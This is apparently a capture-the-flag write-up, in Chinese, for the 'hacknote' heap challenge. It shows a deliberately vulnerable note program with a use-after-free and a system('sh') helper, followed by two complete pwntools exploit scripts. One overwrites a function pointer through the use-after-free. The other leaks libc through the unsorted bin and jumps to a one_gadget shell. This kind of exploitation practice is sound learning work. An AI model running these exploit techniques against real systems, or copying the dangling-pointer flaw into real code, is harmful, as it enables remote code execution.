# pwn
## hacknote
题目源代码，修改了magic函数为getshell，libc-2.23.so:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

struct note {
	void (*printnote)();
	char *content ;
};

struct note *notelist[5];
int count = 0; 

void print_note_content(struct note *this){
	puts(this->content);
}
void add_note(){
	int i ;
	char buf[8];
	int size ;
	if(count > 5){
		puts("Full");
		return ;
	}
	for(i = 0 ; i < 5 ; i ++){
		if(!notelist[i]){
			notelist[i] = (struct note*)malloc(sizeof(struct note));
			if(!notelist[i]){
				puts("Alloca Error");
				exit(-1);
			}
			notelist[i]->printnote = print_note_content;
			printf("Note size :");
			read(0,buf,8);
			size = atoi(buf);
			notelist[i]->content = (char *)malloc(size);
			if(!notelist[i]->content){
				puts("Alloca Error");
				exit(-1);
			}
			printf("Content :");
			read(0,notelist[i]->content,size);
			puts("Success !");
			count++;
			break;
		}
	}
}

void del_note(){
	char buf[4];
	int idx ;
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= count){
		puts("Out of bound!");
		_exit(0);
	}
	if(notelist[idx]){
		free(notelist[idx]->content);
		free(notelist[idx]);
		puts("Success");
	}
}

void print_note(){
	char buf[4];
	int idx ;
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= count){
		puts("Out of bound!");
		_exit(0);
	}
	if(notelist[idx]){
		notelist[idx]->printnote(notelist[idx]);
	}
}

void magic(){
	system("sh");
}


void menu(){
	puts("----------------------");
	puts("       HackNote       ");	
	puts("----------------------");
	puts(" 1. Add note          ");
	puts(" 2. Delete note       ");
	puts(" 3. Print note        ");
	puts(" 4. Exit              ");
	puts("----------------------");
	printf("Your choice :");
};

int main(){
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	char buf[4];
	while(1){
		menu();
		read(0,buf,4);
		switch(atoi(buf)){
			case 1 :
				add_note();
				break ;
			case 2 :
				del_note();
				break ;
			case 3 :
				print_note();
				break ;
			case 4 :
				exit(0);
				break ;
			default :
				puts("Invalid choice");
				break ;

		}
	}
	return 0;
}

```
解法1：
使用uaf
```python
# uaf
from pwn import *
# delete this line to connect remote 
context.log_level='debug'
context.terminal=['bash']
debug=1
gdb_script='''
attach {pid}
source loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''

# write gdb script,use source /tmp/{elf_name}_gdb to load.
def add_gdb_script(elf_name:str,script:str):
    with open("/tmp/{}_gdb".format(elf_name),'w') as f:
        f.write(script)

def ld_libc_source_path(arch:str,version:str):
    libc_source_path="libc/usr/src/glibc/glibc-{}/".format(version)
    if arch=="amd64":
        ld_path="./libc/lib/x86_64-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/x86_64-linux-gnu/libc-{}.so'.format(version)
    elif arch=="i386":
        ld_path="./libc/lib/i386-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/i386-linux-gnu/libc-{}.so'.format(version)
    libc_symbol_path=libc_path.replace("/lib/","/usr/lib/debug/lib/")
    return (ld_path,libc_path,libc_symbol_path,libc_source_path)

# load elf， change this
elf_name='hh'
elf=ELF(elf_name)
context.arch=elf.arch
# libc_start_main_got=elf.got['__libc_start_main']
elf_start=elf.entry


# load libc. default use system libc 
libc_path='/lib/x86_64-linux-gnu/libc.so.6'
ld_path='/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
# set libc version
libc_version="2.23"
# 注释这行使用系统glibc
ld_path,libc_path,libc_symbol_path,libc_source_path=ld_libc_source_path(context.arch,libc_version)
libc=ELF(libc_path)
libc_base=0

# patch elf
# os.system("patchelf --set-interpreter {} {}".format(ld_path,elf_name))
# os.system("patchelf --replace-needed libc.so.6 {} {}".format(libc_path,elf_name))
elf=ELF(elf_name)
remote_addr=['127.0.0.1',4000]
def libc_start_main_addr()->int:
    return libc_base+libc.symbols['__libc_start_main']
def system_addr()->int:
    return libc_base+libc.symbols["system"]
def sh_addr()->int:
    return libc_base+libc.search(b"/bin/sh").__next__()
if debug:
    p=process(elf_name)
else:
    p=remote(remote_addr[0],remote_addr[1])
    
# 注意remote的时候p是没有pid的，随便改个数字
add_gdb_script(elf_name,gdb_script.format(pid=p.pid,libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))


def add(size:int,content:bytes):
    p.recvuntil(b"choice :")
    p.sendline(b'1')
    p.recvuntil(b"size :")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content :")
    p.sendline(content)

def delete(index:int):
    p.recvuntil(b"choice :")
    p.sendline(b'2')
    p.sendline(str(index).encode())

def print_note(index:int):
    p.recvuntil(b"choice :")
    p.sendline(b'3')
    p.sendline(str(index).encode())

magic=0x40167a
magic=0x40169a
pause()
add(50,b'aaa')
pause()

add(50,b'aaa')
pause()

delete(0)
delete(1)
add(16,p64(magic))
print_note(0)

p.interactive()
```
解法2，使用unsorted bin泄露chunk然后调用one_gadget
```python
# unsorted bin attack
from pwn import *
# delete this line to connect remote 
context.log_level='debug'
context.terminal=['bash']
debug=1
gdb_script='''
attach {pid}
source loadsym.py
loadsym {libc_symbol_path}
dir {libc_source_path}
dir {libc_source_path}/libio
'''

# write gdb script,use source /tmp/{elf_name}_gdb to load.
def add_gdb_script(elf_name:str,script:str):
    with open("/tmp/{}_gdb".format(elf_name),'w') as f:
        f.write(script)

def ld_libc_source_path(arch:str,version:str):
    libc_source_path="libc/usr/src/glibc/glibc-{}/".format(version)
    if arch=="amd64":
        ld_path="./libc/lib/x86_64-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/x86_64-linux-gnu/libc-{}.so'.format(version)
    elif arch=="i386":
        ld_path="./libc/lib/i386-linux-gnu/ld-{}.so".format(version)
        libc_path='./libc/lib/i386-linux-gnu/libc-{}.so'.format(version)
    libc_symbol_path=libc_path.replace("/lib/","/usr/lib/debug/lib/")
    return (ld_path,libc_path,libc_symbol_path,libc_source_path)

# load elf， change this
elf_name='hacknote_2.23'
elf=ELF(elf_name)
context.arch=elf.arch
# libc_start_main_got=elf.got['__libc_start_main']
elf_start=elf.entry


# load libc. default use system libc 
libc_path='/lib/x86_64-linux-gnu/libc.so.6'
ld_path='/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
# set libc version
libc_version="2.23"
# 注释这行使用系统glibc
ld_path,libc_path,libc_symbol_path,libc_source_path=ld_libc_source_path(context.arch,libc_version)
libc=ELF(libc_path)
libc_base=0

# patch elf
# os.system("patchelf --set-interpreter {} {}".format(ld_path,elf_name))
# os.system("patchelf --replace-needed libc.so.6 {} {}".format(libc_path,elf_name))
elf=ELF(elf_name)
remote_addr=['127.0.0.1',4000]
def libc_start_main_addr()->int:
    return libc_base+libc.symbols['__libc_start_main']
def system_addr()->int:
    return libc_base+libc.symbols["system"]
def sh_addr()->int:
    return libc_base+libc.search(b"/bin/sh").__next__()
if debug:
    p=process(elf_name)
else:
    p=remote(remote_addr[0],remote_addr[1])
    
# 注意remote的时候p是没有pid的，随便改个数字
add_gdb_script(elf_name,gdb_script.format(pid=p.pid,libc_symbol_path=libc_symbol_path,libc_source_path=libc_source_path))


def add(size:int,content:bytes):
    p.recvuntil(b"choice :")
    p.sendline(b'1')
    p.recvuntil(b"size :")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content :")
    p.send(content)

def delete(index:int):
    p.recvuntil(b"choice :")
    p.sendline(b'2')
    p.recvuntil(b"Index :")
    p.sendline(str(index).encode())

def print_note(index:int):
    p.recvuntil(b"choice :")
    p.sendline(b'3')
    p.recvuntil(b"Index :")
    p.sendline(str(index).encode())
    return p.recvline()
    

one_gadget=0x45226
# 防止触发合并，一次malloc两个chunk
add(400,b'aaa')
add(400,b'aaa')
delete(0)
# 设置正确的print指针。
add(400,b'a')

unsorted_bin_addr=print_note(0)
unsorted_bin_addr=u64(unsorted_bin_addr[:6].ljust(8,b'\x00'))
unsorted_bin_addr&=0xffffffffff00
libc_base=unsorted_bin_addr-0x3c4b00
print(hex(libc_base))
one_gadget=one_gadget+libc_base
print(hex(one_gadget))

# 防止后向合并
add(400,b'a')

delete(0)
delete(1)
pause()
add(16,p64(one_gadget))
p.sendline(b'3')
p.recvuntil(b"Index :")
p.sendline(str(0).encode())
# print_note(0)

p.interactive()
```